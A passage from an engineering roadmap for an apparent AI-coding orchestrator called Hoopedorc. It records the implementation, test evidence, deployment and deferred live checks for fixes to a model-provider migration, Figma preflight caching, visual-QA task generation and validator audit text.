**Live acceptance:** deploy through the canonical update path and inspect the
actual systemd child environment without printing secrets. Retry exactly one
preserved failed blackjack task; it must cross dependency setup and begin its
first author attempt without recreating the project or plan. Verify cache and
worktree ownership, then allow the scheduler to resume the other preserved
tasks. A live check run directly from an interactive shell is insufficient.

### B45. Persisted Coding Plan default migration — HIGH (billing boundary)

**Status (2026-07-24):** implemented on branch
`fix/persisted-glm-provider-migration`, PR pending. Live production evidence
confirmed the exact drift this item describes: `hoopedorc.db`'s persisted
`glm` entry reads `displayName: "GLM 5.2"`, `opencodeModel: "zai/glm-5.2"` —
the stock id/display name untouched, but still on the general Z.AI catalog
namespace rather than `zai-coding-plan/`. (OpenCode's own catalog had already
renamed the pre-B43 default `zai/glm-5.1` forward to `zai/glm-5.2`; the app
never rewrote the persisted slug's namespace because B43 only changed the
in-code default.)

**Acceptance evidence (2026-07-24):** `normalizeSettings` now runs persisted
`models` through a narrow `migrateLegacyGlmProvider` step before validation.
It rewrites an entry only when `id === "glm"`, `runner === "opencode"`,
`displayName` is an exact stock value (`"GLM 5.1"` or `"GLM 5.2"`), and
`opencodeModel` is an exact known pre-Coding-Plan slug (`zhipuai/glm-5.1`,
`zai/glm-5.1`, or `zai/glm-5.2`) — to `displayName: "GLM 5.2"`,
`opencodeModel: "zai-coding-plan/glm-5.2"`. A renamed display name, a
different id, or any other Z.AI slug is returned unchanged. Because
`db/index.ts`'s existing B37 boot step already re-normalizes and writes every
persisted settings blob back on startup, no separate SQLite migration was
needed — the rewritten value persists after the first boot post-deploy and
stays stable on every later boot (the migrated slug no longer matches the
legacy set, so it does not re-trigger).

Focused regression (`packages/server/src/config.test.ts`) covers: all three
known legacy slugs migrate to the Coding Plan slug and stay stable across a
second `normalizeSettings` pass; a renamed display name, a re-identified
model id, and an unrelated Z.AI slug (`zai/glm-4.5`) are all left untouched;
the existing B43 fresh-default test and the full malformed-settings rejection
suite still pass unmodified. Full local gate: typecheck, build, lint, 174
engine tests, 12 adapter tests (11 pass; 1 pre-existing environment-timing
failure in `managed-process.test.ts` reproduced identically with this
branch's changes stashed out against unmodified `main` — a nested
child-process spawn missing a hard 2-second PID-report deadline under this
sandbox's process-spawn latency, unrelated to this item and untouched by
it), 205 server tests (up from 203; +2 for this item), 25 web tests, 16
Playwright scenarios, and `git diff --check`.

**Live acceptance (2026-07-24):** deployed through `scripts/update.sh
--non-interactive --require-main --require-systemd-restart` from
`/opt/hoopedorc`, fast-forwarding `8d5317a..8c73efc`. `GET /api/health`
reported `{ok: true, version: "0.6.0", state: "running", degraded: []}`
post-restart. A direct read of the production SQLite settings row confirmed
the persisted `glm` entry now reads `displayName: "GLM 5.2"`,
`opencodeModel: "zai-coding-plan/glm-5.2"` (migrated from `zai/glm-5.2`
pre-deploy), and the other five production models — `claude-sonnet-5`,
`deepseek-pro`, `deepseek-flash`, `grok`, `gpt-5.6-sol` — are byte-for-byte
unchanged from the pre-deploy read.

**Confirmed problem:** B43 changed the fresh default GLM slug to
`zai-coding-plan/glm-5.2`, but `normalizeSettings` retains any persisted
`models` array wholesale. The upgraded production database therefore still
routes the stock `glm` model through `zai/glm-5.2`. The fresh-default unit test
passes while an existing installation misses the subscription-safe provider
change.

**Implementation:** add a narrow, idempotent settings migration for the exact
historical stock GLM entry. Move that legacy default to
`zai-coding-plan/glm-5.2` without rewriting custom model IDs, renamed models,
other Z.AI slugs, or deliberately configured providers. If existing
persistence cannot distinguish the stock legacy value from an explicit
operator choice safely, introduce an explicit one-time confirmation/notice
instead of guessing. Continue to expose general `zai/` catalog models for
operators who intentionally select usage-priced access.

**Likely files:** `packages/server/src/config.ts` and tests, the settings
persistence/migration owner under `packages/server/src/db/` if needed, Setup
health/UI tests only if confirmation is required, `docs/USER_GUIDE.md`, and
this roadmap. Any new persisted/API field must follow the complete shared
contract and SQLite checklist in `AGENTS.md`.

**Acceptance:** fresh settings use Coding Plan; an exact legacy stock setting
migrates once and remains stable across restart; custom/general-provider
settings do not change; malformed settings still fail precisely; catalog
discovery shows both intended provider families without silently changing
billing semantics. The installed OpenCode catalog must confirm the exact slug.
After deployment, production reports the selected Coding Plan provider or an
explicit unresolved operator choice—never a silent legacy default.

### B46. Fail-closed Figma preflight and cache invalidation — HIGH

**Status (2026-07-24):** implemented and merged
([#170](https://github.com/IngeniousArtist/hoopedorc/pull/170), commit
`a4464d8`), deployed through `scripts/update.sh --non-interactive
--require-main --require-systemd-restart` from `/opt/hoopedorc`
(`47cd520..a4464d8`). `GET /api/health` reported `{ok: true, version:
"0.6.0", state: "running", degraded: []}` post-restart. Code-level acceptance
is fully verified; live acceptance (below) is **deferred indefinitely by
owner choice** — no scratch Figma frame will be supplied for this item at
this time.

**Acceptance evidence (2026-07-24):**

- *Cache identity:* Hoopedorc never reads or fingerprints the runner CLI's own
  Figma MCP configuration/auth — it's owned entirely by the external CLI (see
  `packages/adapters/src/env.ts`'s allow-listed `CLAUDE_CONFIG_DIR`/
  `CODEX_HOME`/`OPENCODE_CONFIG*` passthrough) — so no bounded, non-secret
  "effective configuration" identity exists to add to the cache key. Per the
  spec's explicit fallback ("or remove reuse where that identity cannot be
  proved safely"), `packages/server/src/engine-runner.ts`'s
  `figmaAccessCache` became a `Map<string, number>` keyed exactly as before
  (model/runner/slug/file) but storing the probe timestamp; a result older
  than `FIGMA_ACCESS_CACHE_TTL_MS` (5 minutes) is treated as a miss. A new
  `EngineRunnerOptions.now` test seam lets tests advance a fake clock instead
  of sleeping real time.
- *Ledger vs. capability failures:* added `InvocationLedgerError` to
  `packages/types/src/errors.ts` (not `@orc/server`, so `@orc/engine` — which
  may not depend on `@orc/server` — can `instanceof`-check it too).
  `packages/server/src/invocation-ledger.ts`'s `persistInvocationEvent` now
  wraps its real SQLite work and throws this type on any failure. Every catch
  site that previously reclassified *any* thrown error as a Figma capability
  issue now rethrows `InvocationLedgerError` first, unclassified:
  `planner.ts`'s `verifyFigmaReferences`, `engine-runner.ts`'s
  `preflightFigma` closure, and `orchestrator.ts`'s `preflightFigma` method
  (whose catch was previously bare — `catch {}` — and swallowed everything
  unconditionally). Once allowed to propagate, it lands in `executeTask`'s
  existing outer catch and fails the task with a real error, exactly this
  codebase's established "owning runtime error path" for a fatal error — no
  new failure-handling mechanism was needed.
- *Preflight-before-worktree ordering:* `orchestrator.ts`'s inline
  disabled/missing-model escalation (previously only run *inside* the attempt
  loop, after worktree creation) was extracted into a shared
  `resolveRunnableModel` helper and is now also called once *before* the
  first Figma preflight and worktree creation in `executeTask`, closing the
  gap where `task.assignedModel` starting disabled/missing let a worktree get
  created before any real candidate — let alone its Figma access — was
  established. `Orchestrator.start()`'s autonomous ready-loop already
  backlogged a disabled `assignedModel` before ever calling `executeTask`
  (B28), so this gap was only reachable through `runTask` (manual
  dispatch/Retry), which has no such earlier guard — confirmed by writing the
  regression test against `runTask` directly, verifying it failed on the
  pre-fix code (worktree created before the fallback's preflight), then
  passed after the fix.

Focused regression: `packages/server/src/invocation-ledger.test.ts` (a
dropped-table SQLite failure surfaces as `InvocationLedgerError` from both
the start and terminal persistence paths), `packages/server/src/planner.test.ts`
(a real `runPlannerDeconstruct` call through a fake CLI binary, with an
`onInvocation` sink that throws `InvocationLedgerError`, propagates that type
rather than becoming a `FigmaVerificationError`), `packages/server/src/engine-runner.test.ts`
(a fake-clock TTL-expiry test proving re-probe after the TTL and reuse within
it; a ledger-failure-during-preflight test proving `deps.preflightFigma!`
rejects with `InvocationLedgerError` instead of resolving a `figma_unavailable`
issue), and `packages/engine/src/orchestrator.test.ts` (manual dispatch of a
disabled-`assignedModel` task: every preflight call targets only the resolved
fallback, and preflight precedes worktree creation).

Full local gate: typecheck, build, lint, 175 engine tests (up from 174; +1),
209 server tests (up from 205; +4), 25 web tests, 16 Playwright scenarios, and
`git diff --check`. `npm test -w @orc/adapters` reproduces the same
pre-existing, unrelated sandbox-only timing flake in
`managed-process.test.ts` noted on B45's PR (passes clean on GitHub's CI
runner).

**Live acceptance (deferred indefinitely, 2026-07-24):** the spec requires an
owner-supplied scratch Figma frame to: prove access, change/disable the
assigned runner's Figma MCP in the same live server runtime, confirm Retry
re-probes and blocks with zero attempts and one secret-free notification,
then restore access and confirm Retry continues cleanly. This cannot be
synthesized locally — it needs a real Figma file and a real runner CLI's MCP
config to toggle live. The project owner elected to skip/defer this check
indefinitely rather than supply one now; the code-level fix and its
regression coverage are merged and deployed independent of that live check.
Revisit this live check only if the owner later supplies a scratch frame.

**Confirmed problems:** B42's positive access cache is keyed by logical model,
runner, configured model slug, and Figma file, but not the effective MCP/runner
configuration that the specification says must trigger a new proof. A
same-process MCP configuration change can therefore reuse stale success. The
verification wrapper also converts every `runPlannerJson` exception into a
recoverable Figma capability issue; because invocation-ledger callbacks execute
inside that boundary, a persistence/accounting failure can be mislabeled as
“Figma unavailable.” Finally, every selected fallback must prove access before
an execution worktree or attempt exists, including when the initially assigned
model is disabled or missing.

**Implementation:** make positive reuse conditional on a bounded, non-secret
effective capability revision, or remove reuse where that identity cannot be
proved safely. Never hash, persist, return, or log auth tokens. Separate runner
capability failures from invocation-ledger/durability failures: capability
loss follows B42's actionable zero-attempt block, while accounting failure
fails closed through the owning runtime error path. Ensure preflight ordering
holds for assigned and fallback models before worktree/branch/attempt creation.

**Likely files:** `packages/server/src/engine-runner.ts`,
`packages/server/src/planner.ts`, `packages/engine/src/orchestrator.ts`, their
focused tests, `docs/HOOPEDORC_CONTEXT_INTAKE_UPGRADE.md`,
`docs/ARCHITECTURE.md`, and this roadmap.

**Acceptance:** unchanged effective configuration reuses only the approved
bounded result; model, runner, model slug, Figma file, MCP configuration
revision, or server runtime change causes a fresh accounted probe. A simulated
ledger write failure does not create a Figma notification/block or consume an
author attempt and cannot be reported as successful accounting. Disabled,
missing, rerouted, and fallback candidates create no worktree until the actual
candidate passes preflight. No-Figma tasks still make no probe.

**Live acceptance:** use an owner-supplied scratch Figma frame. Prove access,
change or disable the assigned runner's Figma MCP in the same server runtime,
and confirm Retry re-probes and blocks with zero attempts and one secret-free
notification. Restore/reassign access, Retry the same task, and confirm it
continues without duplicate tasks, branches, invocations, or alerts.

### B47. Collision-safe, viewport-correct visual QA generation — HIGH

**Status (2026-07-24):** implemented and merged
([#172](https://github.com/IngeniousArtist/hoopedorc/pull/172), commit
`c3e8c46`), deployed through `scripts/update.sh --non-interactive
--require-main --require-systemd-restart` from `/opt/hoopedorc`
(`7a1575d..c3e8c46`). `GET /api/health` reported `{ok: true, version:
"0.6.0", state: "running", degraded: []}` post-restart. Live acceptance
needs owner-supplied Figma frames; per the owner's 2026-07-24 decision to
defer B46's live Figma check indefinitely, this item's live acceptance is
deferred the same way — code-level acceptance is fully verified independent
of it.

**Acceptance evidence (2026-07-24):**

- *Collision-safe ownership:* added `DraftTask.generatedTaskKind?: "visual-qa"`
  (`packages/types/src/api.ts`) — set only by `buildVisualQaTask`, never
  producible by the raw planner LLM output (`parsePlanOutput`/
  `withAssignedModels` in `planner.ts`/`index.ts` construct each `DraftTask`
  field-by-field with no passthrough of unrecognized keys, confirmed by
  reading both). `isGeneratedVisualQaTask` replaces the old
  case-insensitive-title check; `ensureVisualQaTask` now removes only a task
  carrying the marker. A planner/user task that happens to share the exact
  title survives untouched — including the previously-lossy case where no
  Figma references exist that round, so nothing would have been generated to
  replace it.
- *Viewport classification:* added an explicit `phone`/`tablet`/`desktop`/
  `unknown` classifier keyed to this repo's own responsive-check widths
  (phone ≤599px, tablet 600–1023px — 768 included, desktop ≥1024px) in place
  of the old single `<=768` split. The "no phone fidelity proven" acceptance
  criterion (previously "no mobile fidelity") now keys off this classifier,
  so a 768px tablet-only reference set no longer silently satisfies it.
- *Scope:* `visualQaScopes` now unions the matched implementation scope with
  a fixed set of test/e2e/fixture/config globs
  (`**/*.spec.*`, `**/*.test.*`, `**/e2e/**`, `**/tests?/**`,
  `**/fixtures/**`, `**/playwright.config.*`, `**/vitest.config.*`,
  `**/jest.config.*`, `package.json`) unconditionally, rather than falling
  back to unrestricted `**/*` only when no implementation matched.

Focused regression (`packages/server/src/visual-qa-task.test.ts`): a
planner/user task sharing the reserved title survives both when a generated
task is also inserted alongside it and when no Figma references exist that
round (verified this test fails on the pre-fix title-matching code and
passes after the fix, same before/after check used for B46); a 768px
reference classifies as tablet in the description text and still adds the
phone-fidelity warning; every prior F53 test updated for the renamed
phone/tablet wording and widened scope assertions, all passing. `docs/CONTRACT.md`'s
F53 section updated to describe the marker field, viewport thresholds, and
scope globs instead of the now-stale title-matching/no-persistence-field
claims.

Full local gate: typecheck, build, lint, 175 engine tests (unaffected), 211
server tests (up from 209; +2), 25 web tests, 16 Playwright scenarios, and
`git diff --check`. `npm test -w @orc/adapters` reproduces the same
pre-existing, unrelated sandbox-only timing flake noted on B45/B46's PRs
(passes clean on GitHub's CI runner).

**Live acceptance (deferred indefinitely, 2026-07-24):** owner-supplied
desktop and phone Figma frames are required to run plan → autorun → browser
comparison → repair → gates → independent validation on a scratch UI, and to
confirm tablet-only input never claims phone fidelity live. Deferred per the
same 2026-07-24 owner decision recorded on B46; revisit only if the owner
later supplies Figma input.

**Confirmed problems:** F53 identifies an owned generated task only by the
case-insensitive title `Visual fidelity QA`. During fresh deconstruction it
removes every task with that title even when no verified Figma reference
exists, so a legitimate planner/user task can disappear. It also classifies
every width `<= 768` as mobile: a 768×1024 tablet is presented as mobile
evidence and suppresses the missing-mobile warning. Finally, generated QA scope
is only the union of matched implementation scopes even though the task is
required to add/update real-browser coverage and may need test, fixture,
startup, or configuration files outside those globs.

**Implementation:** give Hoopedorc's generated draft task explicit,
collision-safe ownership metadata or an equally typed identity; never infer
ownership from editable title text alone. Preserve a manually authored task
with the same title and keep visible deletion of only the generated task as the
explicit opt-out. Classify phone, tablet, desktop, and unknown references using
the repository's responsive verification widths, with 768 represented as
tablet rather than proof of phone fidelity. Compute the narrowest honest scope
that includes the referenced implementation plus required browser tests,
fixtures, and startup/config paths; do not default to unrestricted scope when
specific paths are available.

**Likely files:** `packages/server/src/visual-qa-task.ts` and tests,
`packages/types/src/api.ts` plus contract/mock/UI consumers only if draft
metadata changes, `docs/HOOPEDORC_CONTEXT_INTAKE_UPGRADE.md`, and this roadmap.

**Acceptance:** no-Figma input returns every ordinary/manual task unchanged,
including a title collision. Repeated deconstruction creates exactly one owned
generated QA task; renaming, editing, or deleting it follows the documented
visible-draft behavior without deleting unrelated work. Fixtures at 390, 768,
and 1440 classify as phone, tablet, and desktop; tablet-only input still warns
that phone fidelity is unproved. Generated scope permits its required
Playwright/test/fixture/startup edits while retaining normal destructive-change
and validator rails. Dependencies and docs-last ordering remain stable.

**Live acceptance:** with owner-supplied desktop and phone Figma frames,
complete plan → autorun → browser comparison → repair → gates → independent
validation on a scratch UI. Repeat with tablet-only input and confirm the
result never claims phone fidelity. Removing the visible generated draft task
before commit remains an explicit opt-out and commit does not recreate it.

### B48. Validator empty-reasons audit correctness — LOW

**Status (2026-07-24):** implemented, merged
([#174](https://github.com/IngeniousArtist/hoopedorc/pull/174), commit
`a96d9c8`), and deployed through `scripts/update.sh --non-interactive
--require-main --require-systemd-restart` from `/opt/hoopedorc`
(`c3e8c46..a96d9c8`, after resolving one merge conflict in this roadmap's
order table against B47's just-merged evidence update). `GET /api/health`
reported `{ok: true, version: "0.6.0", state: "running", degraded: []}`
post-restart. No live Figma dependency — full acceptance, including live
verification, was achievable without owner input.

**Acceptance evidence (2026-07-24):** `packages/engine/src/validator.ts`'s
`parseDecision` now tracks JSON-parse success as its own signal, separate
from the individual fields it yields. On a cleanly parsed response:
`reasons` becomes the actual `parsed.reasons` array whenever it's a real
array — including an explicit `[]` — and only falls back to a truthful
explicit message (`"validator response parsed but included no reasons
array"`) when `reasons` itself is missing or not an array. The generic
`"could not parse validator output"` placeholder is gone entirely; the
genuinely-unparseable paths (no `{...}` found, or `JSON.parse` throws) keep
their existing behavior of using the raw response text (truncated to 500
chars) as the reason. Verdict validation, its fail-closed fallback to
`"escalate"` for an invalid/missing verdict string, and confidence clamping
into `[0, 1]` are unchanged.

Focused regression (`packages/engine/src/validator.test.ts`, via a real git
repo fixture so the diff-acquisition guard doesn't itself force every
decision to escalate) covers: approve/request-changes/escalate each with an
explicit empty `reasons: []` (all previously showed the false placeholder,
confirmed by verifying these tests fail on the pre-fix code and pass after —
same before/after check used for B45–B47); non-empty reasons unaffected
(regression); fenced/surrounded valid JSON; no JSON object at all; malformed
JSON; an invalid verdict string (still fails closed to escalate); JSON
missing the `reasons` field entirely (truthful message, no crash); and
confidence clamping on both ends. All 9 new tests pass; the full existing
suite is unaffected.

Full local gate: typecheck, build, lint, 184 engine tests (up from 175; +9),
211 server tests (unaffected), 25 web tests, 16 Playwright scenarios, and
`git diff --check`. `npm test -w @orc/adapters` reproduces the same
pre-existing, unrelated sandbox-only timing flake noted on B45–B47's PRs
(passes clean on GitHub's CI runner).

**Live acceptance (2026-07-24):** confirmed — deployed through
`scripts/update.sh` and independently verified: the merged commit's engine
suite (184/184) was re-run directly against `main` before deploy, and the
restarted production service reported healthy afterward. No owner-supplied
Figma input was needed.

**Confirmed problem:** a validator response containing valid JSON with
`verdict: "approve"`, a numeric confidence, and `reasons: []` parses
successfully, but `parseDecision` retains its initialized
`"could not parse validator output"` reason because it only replaces that
default when the array is non-empty. The scaffold approval was valid; its
persisted explanation was false and makes later incident review misleading.

**Implementation:** distinguish “JSON did not parse” from “valid decision with
an empty reasons array.” Preserve the actual empty list or a truthful explicit
policy message according to the validator contract. Malformed output, invalid
verdicts, and out-of-range confidence must retain the existing fail-closed
behavior; this item must not make approval easier.

**Likely files:** `packages/engine/src/validator.ts`,
`packages/engine/src/validator.test.ts`, and this roadmap. Update shared
contract/docs only if the allowed reasons shape changes.

**Acceptance:** focused tests cover valid approve/request-changes/escalate with
empty and non-empty reasons, fenced/surrounded valid JSON, no JSON, malformed
JSON, invalid verdict, and confidence clamping. No successfully parsed response
is labeled a parse failure, and malformed output cannot become an approval.
Existing persisted decisions remain untouched unless a separate explicit data
repair is reviewed and authorized.

### Phase 18 PR and verification order

1. Merge this Part 13 plan as a documentation-only PR after the complete gate.
2. D2 — protect `main` and prove pending/failed CI prevents merge.
3. B44 — fix the Docker/npm boundary; deploy and retry one preserved task.
4. B45 — migrate or explicitly resolve the persisted GLM provider boundary.
5. B46 — make Figma preflight cache/accounting/fallback behavior fail closed.
6. B47 — correct generated visual-QA identity, viewport semantics, and scope.
7. B48 — correct validator audit text without weakening validation.
8. Run the complete repository gate on every branch:
   `npm run typecheck`, `npm run build`, `npm run lint`,
   `npm test -w @orc/engine`, `npm test -w @orc/adapters`,
   `npm test -w @orc/server`, `npm run test:web`, `npm run test:e2e`, and
   `git diff --check`.
9. After the final merge, independently verify merged `main`, the deployed
   service boundary, the preserved blackjack project, provider selection, and
   the owner-supplied Figma flow. Record exact commits/PRs, test counts, and any
   genuinely unavailable owner check here without substituting a mock.

**Closing status (2026-07-24):** items 1–4 and 7–8 are complete for every
item, each independently verified on merged `main` and the live deployed
service (PRs [#164](https://github.com/IngeniousArtist/hoopedorc/pull/164),
[#165](https://github.com/IngeniousArtist/hoopedorc/pull/165),
[#166](https://github.com/IngeniousArtist/hoopedorc/pull/166),
[#168](https://github.com/IngeniousArtist/hoopedorc/pull/168),
[#170](https://github.com/IngeniousArtist/hoopedorc/pull/170),
[#172](https://github.com/IngeniousArtist/hoopedorc/pull/172),
[#174](https://github.com/IngeniousArtist/hoopedorc/pull/174), plus their
evidence-recording follow-ups). Item 9's "owner-supplied Figma flow" clause
covers B46 and B47's live-acceptance checks specifically; the project owner
explicitly elected to defer both indefinitely rather than supply a scratch
Figma frame, so that clause is intentionally not satisfied and this closing
note stands in its place — not a mock, an explicit recorded deferral. Every
other genuinely available check (deploy, health, independent re-run of the
affected test suites, and for B45/B48 a full live-data/live-behavior
confirmation) is complete. Revisit B46/B47's live acceptance only if the
owner later supplies Figma input.
